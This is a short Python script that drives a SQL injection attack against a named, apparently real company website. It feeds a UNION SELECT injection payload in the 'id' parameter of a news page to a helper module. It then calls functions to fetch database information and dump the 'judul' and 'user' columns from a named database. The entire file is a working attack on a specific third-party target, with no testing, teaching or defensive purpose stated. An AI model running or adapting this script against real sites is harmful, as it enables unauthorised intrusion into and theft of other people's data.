from modules import Sqli

SqliHelper = Sqli("https://www.kabelindo.co.id/readnews.php?id=28%20and%200%20union%20select%201,2,*,4,5--+-")

informations = SqliHelper.information()
# print(informations)
dump_data = SqliHelper.dump_data(tables='news',columns=['judul','user'],database='u9897uwx_kabel')
print(dump_data)
